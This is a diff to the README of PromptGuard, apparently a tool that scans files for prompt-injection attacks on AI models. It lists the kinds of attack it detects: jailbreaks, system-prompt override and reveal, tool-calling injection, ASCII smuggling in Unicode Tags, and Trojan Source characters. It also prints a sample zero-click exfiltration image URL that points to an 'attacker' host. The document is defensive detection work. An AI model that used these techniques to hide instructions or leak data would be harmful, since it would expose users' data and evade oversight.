@@ -68,12 +68,18 @@ The generated `dist/PromptGuard.exe` can be distributed and run with a double-cl
 
 | Severity | Examples |
 |---|---|
-| **CRITICAL** | Credential exfiltration, system prompt override, prompt reveal |
-| **HIGH** | Jailbreak (DAN mode, developer mode), impersonation, code execution |
-| **MEDIUM** | Subtle manipulation, hidden iframes/scripts, javascript: links |
+| **CRITICAL** | Credential exfiltration, system prompt override, prompt reveal, exfiltration via templated image URLs |
+| **HIGH** | Jailbreak (DAN mode, developer mode), impersonation, code execution, tool/function-calling injection |
+| **MEDIUM** | Subtle manipulation, hidden iframes/scripts, javascript: links, fake conversation roles |
 | **LOW** | Secrecy indicators ("don't tell the user", "en secreto") |
 
-**Steganographic analysis:** acrostics, diagonal patterns, hidden base64, zero-width characters, Unicode homoglyphs, hidden comments.
+**Steganographic analysis:** acrostics, diagonal patterns, hidden base64, zero-width characters, Unicode Tags (ASCII smuggling), bidirectional control characters (Trojan Source), Unicode homoglyphs, hidden comments.
+
+Three vectors worth calling out:
+
+- **ASCII smuggling** — an entire prompt encoded in the Unicode Tags block (`U+E0000`–`U+E007F`), which renders as nothing at all. The scanner decodes the payload and reports it.
+- **Trojan Source** — bidirectional control characters (`U+202A`–`U+202E`, `U+2066`–`U+2069`) that make source render differently than it parses (CVE-2021-42574).
+- **Zero-click image exfiltration** — `![](https://attacker/log?d={DATA})` or an equivalent `<img>` tag, where simply rendering the response leaks data. Plain external images are not flagged; only templated URLs and data-carrying query parameters are.
 
 Patterns work in **English and Spanish**.
 
@@ -164,7 +170,7 @@ The scanner is organized in 5 internal modules within a single file:
 | Module | Responsibility |
 |---|---|
 | **Direct Pattern Scanner** | Regex-based detection across 4 severity tiers |
-| **Steganographic Analysis** | Acrostics, diagonals, base64, zero-width chars, homoglyphs, hidden comments |
+| **Steganographic Analysis** | Acrostics, diagonals, base64, zero-width chars, Unicode Tags, bidi controls, homoglyphs, hidden comments |
 | **Input Sources** | Local directory traversal and GitHub shallow clone |
 | **Scoring & Reporting** | 0-100 scoring, classification, JSON report generation |
 | **CLI & Interactive** | Argument parsing, interactive menu, colored output |
